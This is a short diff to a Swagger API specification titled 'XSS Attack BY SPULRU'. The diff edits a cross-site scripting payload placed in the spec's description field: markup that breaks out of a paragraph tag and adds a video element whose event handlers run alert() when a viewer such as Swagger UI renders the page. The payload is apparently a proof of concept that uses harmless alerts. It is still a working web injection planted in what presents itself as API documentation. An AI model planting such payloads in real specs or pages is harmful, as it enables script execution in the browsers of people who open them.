@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: </p><video autoplay/alert() onloadedmetadata=alert(1) onloadeddata=alert(2) onplay=alert(3) onplaying=alert(4) onprogress=alert(5)> <source src="https://www.youtube.com/watch?v=N3MqFK63tRo" type="video/webm"></video><p>
+  description: </p><video autoplay=1 @error=alert() onloadedmetadata=alert(1) onloadeddata=alert(2) onplay=alert(3) onplaying=alert(4) onprogress=alert(5)> <source src="https://www.youtube.com/watch?v=N3MqFK63tRo" type="video/webm"></video><p>
     
   version: production
 basePath: /JSSResource/
